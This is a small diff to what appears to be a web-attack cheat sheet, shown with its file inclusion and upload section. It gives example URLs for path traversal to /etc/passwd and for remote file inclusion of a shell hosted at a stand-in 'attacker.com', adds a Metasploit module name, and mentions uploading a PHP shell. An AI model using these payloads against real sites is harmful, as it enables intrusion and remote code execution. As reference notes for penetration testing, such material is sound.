@@ -99,8 +99,9 @@ _1.3 Other Web Attack_
 File Inclusion/Path Traversal
 //Can try path traversal after having successfully uploaded a file to webapp, by attempting to browse to root folder, in Linux:
 Example: fileshare.com/files.php?file=../../../../../../etc/passwd
-Remote File Inclusion
+Remote File Inclusion (RFI)
 Example: fileshare.com/files.php?file=http://attacker.com/shells/shell.txt
+//MSF use exploit/unix/webapp/php_include
 
 Unrestricted File Upload
 //If file upload doesnt check against file extension uploads, can upload file such as shell2.php and browse
